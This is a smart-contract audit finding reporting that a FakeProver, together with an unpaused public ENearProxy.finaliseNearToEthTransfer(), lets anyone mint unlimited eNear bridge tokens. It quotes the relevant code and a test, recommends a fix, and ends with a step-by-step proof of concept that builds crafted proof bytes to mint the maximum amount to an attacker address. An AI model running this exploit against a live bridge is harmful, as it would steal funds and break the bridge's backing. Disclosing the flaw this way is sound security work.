### Title
`FakeProver.proveOutcome()` Unconditionally Returns `true`, Enabling Unauthorized eNear Token Minting via Public `ENearProxy.finaliseNearToEthTransfer()` — (File: `evm/src/eNear/contracts/FakeProver.sol`)

---

### Summary

`FakeProver.proveOutcome()` accepts any proof data and always returns `true`. `ENearProxy.finaliseNearToEthTransfer()` is a publicly callable function that relies on this prover for its only security gate. Because `ENearProxy` is set as the admin of the non-upgradeable `eNear` contract (bypassing eNear's own pause), any unprivileged attacker can call `ENearProxy.finaliseNearToEthTransfer()` with crafted proof data to mint an arbitrary amount of eNear tokens to any address, with no NEAR locked on the NEAR side.

---

### Finding Description

**Root cause — `FakeProver.proveOutcome()` always returns `true`:**

`FakeProver` implements `INearProver` and unconditionally returns `true` for every call, ignoring both `proofData` and `blockHeight`:

```solidity
// evm/src/eNear/contracts/FakeProver.sol
contract FakeProver is INearProver {
    function proveOutcome(bytes calldata, uint64) external pure returns (bool) {
        return true;
    }
}
```

This contract is intentionally deployed as the live prover for both the `eNear` contract and `ENearProxy` as part of the eNear → OmniBridge migration. The README confirms this design:

> "We will make `eNearProxy` the admin of `eNear` and replace the `Prover` with a `FakeProver` that will successfully verify any proof."

**Vulnerable public entry point — `ENearProxy.finaliseNearToEthTransfer()`:**

```solidity
// evm/src/eNear/contracts/ENearProxy.sol  lines 80-90
function finaliseNearToEthTransfer(
    bytes memory proofData,
    uint64 proofBlockHeight
) external whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER) {
    require(
        prover.proveOutcome(proofData, proofBlockHeight),  // FakeProver → always true
        "Proof should be valid"
    );
    eNear.finaliseNearToEthTransfer(proofData, proofBlockHeight);
}
```

The `initialize()` function never sets `_pausedFlags`, so it defaults to `0` (fully unpaused):

```solidity
// evm/src/eNear/contracts/ENearProxy.sol  lines 33-49
function initialize(
    address _eNear,
    address _prover,
    bytes memory _nearConnector,
    uint256 _currentReceiptId,
    address _adminAddress
) public initializer {
    __Pausable_init();   // _pausedFlags = 0
    prover = INearProver(_prover);  // set to FakeProver
    ...
}
```

`PAUSED_LEGACY_FIN_TRANSFER = 1 << 0 = 1`. Since `_pausedFlags` starts at `0`, the `whenNotPaused(1)` guard passes immediately after deployment.

**Admin bypass of eNear's pause:**

The design sets `ENearProxy` as the admin of the non-upgradeable `eNear` contract via `adminSstore`. The eNear Rainbow Bridge contract allows its admin to call `finaliseNearToEthTransfer` even when paused. The test suite confirms this:

```typescript
// evm/tests/eNearProxy.test.ts  lines 126-141
it("Pause All", async () => {
    await eNear.connect(eNearAdmin).adminPause(PAUSE_TRANSFER_TO_NEAR | PAUSE_FINALISE_FROM_NEAR)
    // mint fails when eNearProxy is NOT admin
    await expect(eNearProxy.connect(alice).mint(...)).to.be.reverted
    // set eNearProxy as admin
    await eNear.connect(eNearAdmin).adminSstore(9, ethers.zeroPadValue(await eNearProxy.getAddress(), 32))
    // mint succeeds even though eNear is paused
    await eNearProxy.connect(alice).mint(await eNear.getAddress(), alice.address, 100)
    expect(await eNear.balanceOf(alice.address)).to.equal(100)
})
```

**Proof data format is publicly known:**

The `mint()` function exposes the exact byte layout that `eNear.finaliseNearToEthTransfer()` parses:

```solidity
// evm/src/eNear/contracts/ENearProxy.sol  lines 58-69
bytes memory fakeProofData = bytes.concat(
    new bytes(72),
    hex"01000000",
    abi.encodePacked(currentReceiptId),
    new bytes(24),
    abi.encodePacked(Borsh.swapBytes4(uint32(nearConnector.length))),
    abi.encodePacked(nearConnector),
    hex"022500000000",
    abi.encodePacked(Borsh.swapBytes16(amount)),
    abi.encodePacked(to),
    new bytes(280)
);
```

An attacker substitutes their own address for `to` and any value for `amount`.

---

### Impact Explanation

An attacker can mint an unbounded supply of eNear tokens (bridged NEAR on Ethereum) to any address without locking any NEAR on the NEAR side. This breaks the 1:1 backing invariant of the bridge, enabling:
- Theft of all real eNear liquidity held by legitimate holders (attacker dumps freshly minted tokens)
- Permanent inflation of the eNear supply, making existing holders' tokens worthless

This is a **Critical** impact: unauthorized minting / loss of bridged funds.

---

### Likelihood Explanation

**High.** The attack requires:
- No special role or privilege
- No admin key compromise
- No front-running
- Only knowledge of the publicly available proof data format (visible in `ENearProxy.mint()`) and an unused receipt ID (any integer not yet consumed by `currentReceiptId`)

The only prerequisite is the intended production state: `ENearProxy` set as admin of `eNear` and `FakeProver` set as eNear's prover — both of which are explicitly described as the deployment goal in the README and deployment scripts.

---

### Recommendation

Pause `PAUSED_LEGACY_FIN_TRANSFER` during `initialize()` so the legacy path is closed from the moment of deployment:

```solidity
function initialize(...) public initializer {
    __Pausable_init();
    _pause(PAUSED_LEGACY_FIN_TRANSFER);  // close legacy path immediately
    ...
}
```

Alternatively, remove `ENearProxy.finaliseNearToEthTransfer()` entirely. The README states that the legacy `finaliseNearToEthTransfer` path is to be paused permanently; the function serves no purpose once `ENearProxy` controls minting via `mint()`.

---

### Proof of Concept

```
1. FakeProver deployed; set as prover for eNear and ENearProxy (production design).
2. ENearProxy deployed with _pausedFlags = 0 (PAUSED_LEGACY_FIN_TRANSFER not set).
3. ENearProxy set as admin of eNear via adminSstore(9, ...).
4. eNear.finaliseNearToEthTransfer paused (as intended).

Attack:
5. Attacker constructs craftedProof:
     bytes.concat(
       new bytes(72), hex"01000000",
       abi.encodePacked(uint64(unusedReceiptId)),
       new bytes(24),
       abi.encodePacked(Borsh.swapBytes4(uint32(nearConnector.length))),
       abi.encodePacked(nearConnector),
       hex"022500000000",
       abi.encodePacked(Borsh.swapBytes16(type(uint128).max)),  // max amount
       abi.encodePacked(attackerAddress),
       new bytes(280)
     )

6. Attacker calls ENearProxy.finaliseNearToEthTransfer(craftedProof, 0).
   → whenNotPaused(1) passes (_pausedFlags == 0).
   → FakeProver.proveOutcome() returns true.
   → ENearProxy (as eNear admin) calls eNear.finaliseNearToEthTransfer(craftedProof, 0),
     bypassing eNear's pause.
   → eNear's FakeProver returns true.
   → eNear parses craftedProof, mints type(uint128).max eNear to attackerAddress.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** evm/src/eNear/contracts/FakeProver.sol (L6-9)
```text
contract FakeProver is INearProver {
    function proveOutcome(bytes calldata, uint64) external pure returns (bool) {
        return true;
    }
```

**File:** evm/src/eNear/contracts/ENearProxy.sol (L33-49)
```text
    function initialize(
        address _eNear,
        address _prover,
        bytes memory _nearConnector,
        uint256 _currentReceiptId,
        address _adminAddress
    ) public initializer {
        __UUPSUpgradeable_init();
        __AccessControl_init();
        __Pausable_init();
        eNear = IENear(_eNear);
        nearConnector = _nearConnector;
        currentReceiptId = _currentReceiptId;
        prover = INearProver(_prover);
        _grantRole(DEFAULT_ADMIN_ROLE, _adminAddress);
        _grantRole(PAUSABLE_ADMIN_ROLE, _msgSender());
    }
```

**File:** evm/src/eNear/contracts/ENearProxy.sol (L58-72)
```text
        bytes memory fakeProofData = bytes.concat(
            new bytes(72),
            hex"01000000",
            abi.encodePacked(currentReceiptId),
            new bytes(24),
            abi.encodePacked(Borsh.swapBytes4(uint32(nearConnector.length))),
            abi.encodePacked(nearConnector),
            hex"022500000000",
            abi.encodePacked(Borsh.swapBytes16(amount)),
            abi.encodePacked(to),
            new bytes(280)
        );

        currentReceiptId += 1;
        eNear.finaliseNearToEthTransfer(fakeProofData, 0);
```

**File:** evm/src/eNear/contracts/ENearProxy.sol (L80-90)
```text
    function finaliseNearToEthTransfer(
        bytes memory proofData,
        uint64 proofBlockHeight
    ) external whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER) {
        require(
            prover.proveOutcome(proofData, proofBlockHeight),
            "Proof should be valid"
        );

        eNear.finaliseNearToEthTransfer(proofData, proofBlockHeight);
    }
```

**File:** evm/src/eNear/README.md (L17-20)
```markdown
We will make `eNearProxy` the admin of `eNear` and replace the `Prover` with a `FakeProver` 
that will successfully verify any proof. 
We will pause the `finaliseNearToEthTransfer` and `transferToNear` functions, 
and only `eNearProxy`, as the admin, will have the ability to call these functions.
```

**File:** evm/tests/eNearProxy.test.ts (L126-141)
```typescript
    it("Pause All", async () => {
      await eNear.connect(eNearAdmin).adminPause(PAUSE_TRANSFER_TO_NEAR | PAUSE_FINALISE_FROM_NEAR)

      await eNearProxy
        .connect(deployer)
        .grantRole(ethers.keccak256(ethers.toUtf8Bytes("MINTER_ROLE")), alice.address)
      await expect(eNearProxy.connect(alice).mint(await eNear.getAddress(), alice.address, 100)).to
        .be.reverted
      expect(await eNear.balanceOf(alice.address)).to.equal(0)

      await eNear
        .connect(eNearAdmin)
        .adminSstore(9, ethers.zeroPadValue(await eNearProxy.getAddress(), 32))
      await eNearProxy.connect(alice).mint(await eNear.getAddress(), alice.address, 100)
      expect(await eNear.balanceOf(alice.address)).to.equal(100)
    })
```
